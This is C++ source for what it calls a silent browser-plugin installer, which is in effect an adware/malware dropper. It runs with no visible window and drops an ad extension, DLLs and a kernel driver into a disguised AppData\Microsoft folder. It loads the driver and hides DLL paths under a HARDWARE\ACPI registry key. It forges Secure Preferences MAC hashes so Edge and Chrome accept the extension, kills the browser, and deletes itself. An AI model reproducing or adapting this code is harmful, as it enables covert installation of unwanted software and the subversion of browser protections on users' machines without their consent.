// InstallPlugin.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。静默安装浏览器插件的安装器（释放文件用的）
//

#include <iostream>
#include "fun.h"
#include <string> 
#include "sp.h"

//res
#include "background.js.h"
#include "content.js.h"
#include "manifest.json.h"
#include "kmemnetb.sys.h"
#include "plugin_x32.dll.h"
#include "plugin_x64.dll.h"


#pragma comment(lib, "Shell32.lib")
#pragma comment(linker, "/SECTION:.rdata,RW")

#pragma comment (linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示exe


#define CFG_WRITE2(key,val) RegWrite2(HKEY_LOCAL_MACHINE,(wchar_t*)L"HARDWARE\\ACPI",REG_BINARY,(wchar_t*)key,(wchar_t*)val,wcslen(val)*sizeof(wchar_t)) 

extern "C" int UnZipFolder(wchar_t* zipFile, wchar_t* destination);
extern "C"  void UnZipFolderFromRes(HMODULE hMod, INT RES_ID, wchar_t* RES_NAME, wchar_t* ddir);
extern "C"  int release_res(HMODULE hMod, INT RES_ID, wchar_t* RES_NAME, wchar_t* filepath);
//
// 先创建chrome edge 配置文件目录
// 修改chrome edge 配置文件
// 释放插件文件
// 加载驱动
#if 1
int Json_Alter(wchar_t* filepath, int type)//修改Preferencesde Json文件 type 1 360   2 edge
{
    int json_Ret = 0;
    size_t len = 0;
    char* file_json_data = read_file(filepath, &len);
    if (!file_json_data)
    {
        json_Ret = 10; 
        return json_Ret;//如果没读到文件直接返回、
    }

    cJSON* root = cJSON_Parse(file_json_data);
    if (!root)
    {
        json_Ret = 10;
        return json_Ret;//如果没读到文件直接返回、
    }
    /*
    "extensions": {
        "settings": {

            "boclhfholknecnmjcnmilnlpghbkhcbd": {
            ...
			}
		}
	}
    */
    cJSON* root_extensions = cJSON_GetObjectItem(root, "extensions");
    if (!root_extensions)//判断extensions是否存在
    {
        root_extensions = cJSON_AddObjectToObject(root, "extensions");
    }

    cJSON* root_extensions_settings = cJSON_GetObjectItem(root_extensions, "settings");
    if (!root_extensions_settings)
    {
        root_extensions_settings = cJSON_AddObjectToObject(root_extensions, "settings");
    }

    cJSON* root_extensions_settings_bd = cJSON_GetObjectItem(root_extensions_settings, "boclhfholknecnmjcnmilnlpghbkhcbd");
    if (!root_extensions_settings_bd)
    {
        if (type == 1)//360系列 boclhfholknecnmjcnmilnlpghbkhcbd
        {
            cJSON* boclhfholknecnmjcnmilnlpghbkhcbd_data = cJSON_Parse(str_360_boclhfholknecnmjcnmilnlpghbkhcbd.c_str());
            //int ret = cJSON_AddItemToObject(root_extensions_settings_bd, str_360_boclhfholknecnmjcnmilnlpghbkhcbd.c_str(), root_extensions_settings);
            int ret = cJSON_AddItemToObject(root_extensions_settings, "boclhfholknecnmjcnmilnlpghbkhcbd", boclhfholknecnmjcnmilnlpghbkhcbd_data);
            json_Ret++;
        }
        else if (type == 0)//edge
        {
            cJSON* boclhfholknecnmjcnmilnlpghbkhcbd_data = cJSON_Parse(str_edge_boclhfholknecnmjcnmilnlpghbkhcbd.c_str());
            //int ret = cJSON_AddItemToObject(root_extensions_settings_bd, str_edge_boclhfholknecnmjcnmilnlpghbkhcbd.c_str(), root_extensions_settings);
            int ret = cJSON_AddItemToObject(root_extensions_settings, "boclhfholknecnmjcnmilnlpghbkhcbd", boclhfholknecnmjcnmilnlpghbkhcbd_data);
            json_Ret++;
        }
    }

    /*
    "protection": {
        "macs": {
            "extensions": {
                "settings": {
					"boclhfholknecnmjcnmilnlpghbkhcbd": "F39B95A9D096EC9FAF0D2192183CC1C2D3D144ED96BCB12A0A9213C4E6647A68"
                    }
            }
        }
    }
    */

    cJSON* root_protection = cJSON_GetObjectItem(root, "protection");
    if (!root_protection)
    {
        root_protection = cJSON_AddObjectToObject(root, "protection");
    }

    cJSON* root_protection_macs = cJSON_GetObjectItem(root_protection, "macs");
    if (!root_protection_macs)
    {
        root_protection_macs = cJSON_AddObjectToObject(root_protection, "macs");
    }

    cJSON* root_protection_macs_extensions = cJSON_GetObjectItem(root_protection_macs, "extensions");
    if (!root_protection_macs_extensions)
    {
        root_protection_macs_extensions = cJSON_AddObjectToObject(root_protection_macs, "extensions");
    }


    cJSON* root_protection_macs_extensions_settings = cJSON_GetObjectItem(root_protection_macs_extensions, "settings");
    if (!root_protection_macs_extensions_settings)
    {
        root_protection_macs_extensions_settings = cJSON_AddObjectToObject(root_protection_macs_extensions, "settings");
    }

    cJSON* root_protection_macs_extensions_settings_bd = cJSON_GetObjectItem(root_protection_macs_extensions_settings, "boclhfholknecnmjcnmilnlpghbkhcbd");
    if (!root_protection_macs_extensions_settings_bd)
    {
        if (type == 1)//360系列 boclhfholknecnmjcnmilnlpghbkhcbd
        {
            cJSON_AddStringToObject(root_protection_macs_extensions_settings, "boclhfholknecnmjcnmilnlpghbkhcbd", "781CCDE223E6A3E534731CBBCEF9059CA186BCEF3F2F9A45B82EBF61AB53389F");
        }
        else if (type == 0)//edge
        {
            cJSON_AddStringToObject(root_protection_macs_extensions_settings, "boclhfholknecnmjcnmilnlpghbkhcbd", "F39B95A9D096EC9FAF0D2192183CC1C2D3D144ED96BCB12A0A9213C4E6647A68");
        }
        json_Ret++;
    }

    std::string new_json = cJSON_Print(root);
    write_file(filepath, (char*)new_json.c_str(), new_json.length());


    free(file_json_data);
    return json_Ret;
}

#endif // 0

//设置浏览器插件
BOOL Set_Secure_Preferences()
{
    const wchar_t* sps[] = {
     L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Secure Preferences",
     L"C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Secure Preferences"/*,
     L"C:\\Users\\Administrator\\AppData\\local\\360chromex\\chrome\\User Data\\Default\\Preferences",
     L"C:\\Users\\Administrator\\AppData\\local\\360chrome\\chrome\\User Data\\Default\\Preferences"*/
    };

   for (size_t i = 0; i < sizeof(sps)/sizeof(wchar_t*); i++)
   {
       wchar_t* sp= (wchar_t*)wcsrchr(sps[i], L'\\');
       if (sp){

           *sp = '\0';
           SHCreateDirectoryExW(NULL, sps[i], NULL);
           sp[0] = '\\';
       }
       //打开文件查看文件是否存在
       //
       if (i == 0)//edge
       {
           if (Json_Alter((wchar_t*)sps[i], 0) == 10)
           {
               write_file(sps[i], (void*)Secure_Preferences_edge.c_str(), Secure_Preferences_edge.length());
           }
           //
       }
       else
       {
           if (Json_Alter((wchar_t*)sps[i], 1) == 10)
           {
               write_file(sps[i], (void*)Secure_Preferences.c_str(), Secure_Preferences.length());
           }
           //write_file(sps[i], (void*)Secure_Preferences.c_str(), Secure_Preferences.length());
       }

   }

    return TRUE;
}

//判断是否为win7系统
int jdgeVersionWin7()
{
    DWORD dwVersion = 0;
    DWORD dwMajorVersion = 0;
    DWORD dwMinorVersion = 0;
    DWORD dwBuild = 0;

    dwVersion = GetVersion();

    // Get the Windows version. dwMajorVersion 10 dwMinorVersion 0    

    dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
    dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));

    // Get the build number.
    if (dwMajorVersion == 6 && dwMinorVersion == 1)//win7
    {
        return 1;
    }
    return 0;
}


BOOL RelessPlugin()
{
    //释放插件
    std::wstring plg = L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\";
    int shcdew_ret = SHCreateDirectoryExW(NULL, L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\imgs", NULL);

    //打印日志
    char szlog[260] = { 0 };
    sprintf(szlog, "[DBG] plugin SHCreateDirectoryExW创建文件夹plg  ret = %d\r\n", shcdew_ret);
    printfLog(szlog);


	//释放文件 插件
    //UnZipFolderFromRes(NULL, 100, (wchar_t*)L"ADBIN", (wchar_t*)plg.c_str());
    int ADGIFret = release_res(NULL, 100, (wchar_t*)L"ADGIF", L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\imgs\\ad.gif");
    int ADCONTENTret = release_res(NULL, 101, (wchar_t*)L"ADCONTENT", L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\content.js");
    int ADMANIFESTret = release_res(NULL, 102, (wchar_t*)L"ADMANIFEST", L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\manifest.json");
    int resoff = ADGIFret + ADCONTENTret + ADMANIFESTret;
    if (resoff != 3)//资源文件释放失败直接结束程序
    {
        printfLog("[DBG] plugin 资源文件释放失败，程序退出\r\n");
        return FALSE;
    }
    //write_file2(plg + L"background.js", BACKGROUND_JS, sizeof(BACKGROUND_JS));
	//write_file2(plg + L"content.js", CONTENT_JS, sizeof(CONTENT_JS));
	//write_file2((plg + L"manifest.json"), MANIFEST_JSON, sizeof(MANIFEST_JSON));

    //释放文件 配合文件
    int plugin_sys = write_file2(plg + L"plugin.sys", KMEMNETB_SYS, sizeof(KMEMNETB_SYS));//驱动
    int plugin_x32 = write_file2(plg + L"plugin_x32.dll", PLUGIN_X32_DLL, sizeof(PLUGIN_X32_DLL));//x32dll
    int plugin_x64 = write_file2(plg + L"plugin_x64.dll", PLUGIN_X64_DLL, sizeof(PLUGIN_X64_DLL));//x64dll

    //打印日志
    memset(szlog,0,260);
    sprintf(szlog, "[DBG] plugin 写文件 sys_ret = %d  x32_ret = %d  x64_ret = %d\r\n", plugin_sys, plugin_x32, plugin_x64);
    printfLog(szlog);

    //加载驱动文件
    HANDLE hDevice = CreateFileA("\\\\.\\kmemnetb", GENERIC_READ , 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        //printf("驱动不存在 释放驱动\n");

        CFG_WRITE2(L"D32", (plg + L"\\plugin_x32.dll").c_str());
        CFG_WRITE2(L"D64", (plg + L"\\plugin_x64.dll").c_str());


        //GetModuleHandle 
        std::wstring sys = L"C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\plg\\plugin.sys";
        int sysret = LoadNTDriver((wchar_t*)L"kmemnetb.sys", (wchar_t*)sys.c_str());
        MoveFile(sys.c_str(), L"C:\\Users\\Administrator\\AppData\\13213.dat");//先移动
        _wremove(L"C:\\Users\\Administrator\\AppData\\13213.dat");//删除驱动本地文件

        //打印日志
        memset(szlog,0,260);
        sprintf(szlog, "[DBG] plugin 安装驱动返回值 sys_ret = %d\r\n", sysret);
        printfLog(szlog);
    }
    else
    {

        //将dll信息写进注册表
        CFG_WRITE2(L"PL32", (plg + L"\\plugin_x32.dll").c_str());
        CFG_WRITE2(L"PL64", (plg + L"\\plugin_x64.dll").c_str());

        CloseHandle(hDevice);

        //打印日志
        printfLog("[DBG] plugin 驱动已被加载\r\n");
        //printf("驱动存在 \n");
        //主页DLL 入口 load PL32 PL64
        //LoadLibraryA
    }
    return TRUE;
}


int main()
{
    setlocale(LC_ALL, "");
    //修改黑白名单
    //OutputDebugStringA("[DBG]plugin 111111111");
    if (!RelessPlugin())
    {
        goto EXIT;
    }
    Modify_b_and_w();
    Set_Secure_Preferences();
    //OutputDebugStringA("[DBG]plugin 22222222");
EXIT:
    //自删，结束msedge
    char szcmdDelMsedge[256] = "taskkill /f /im msedge.exe";
    WinExec(szcmdDelMsedge, SW_HIDE);
    char szcmd[256] = { 0 };
    char szexename[256] = { 0 };
    GetModuleFileNameExA(GetCurrentProcess(), 0, szexename, MAX_PATH);
    sprintf(szcmd, "cmd /c ping 127.0.0.1 -n 3 &del /q/f \"%s\"", szexename);//自删除
    WinExec(szcmd, SW_HIDE);
    return 0;
}

